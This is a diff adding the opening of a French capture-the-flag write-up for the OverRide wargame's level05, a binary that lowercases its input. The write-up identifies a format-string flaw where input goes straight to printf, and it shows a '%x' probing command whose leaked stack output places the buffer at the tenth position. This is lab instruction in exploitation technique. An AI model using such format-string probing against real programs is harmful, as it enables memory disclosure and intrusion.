@@ -1,0 +1,14 @@
+Nous avons ici un binaire qui une fois lance nous affiche un prompt.
+Celui-ci nous convertit les majuscules en minuscule:
+
+level05@OverRide:~$ ./level05
+UPPER TO lower
+upper to lower
+
+un fgets de 100 char est effectue sur notre input, stocker puis afficher via
+printf, format string you know, localisons notre buffer:
+
+level05@OverRide:~$ python -c 'print "AAAA" + " %x" * 15' | ./level05
+aaaa 64 f7fcfac0 f7ec3af9 ffffd6af ffffd6ae 0 ffffffff ffffd734 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825
+
+Il est a la 10eme place, 61 et non 41 car notre 'A' a ete lowercase.
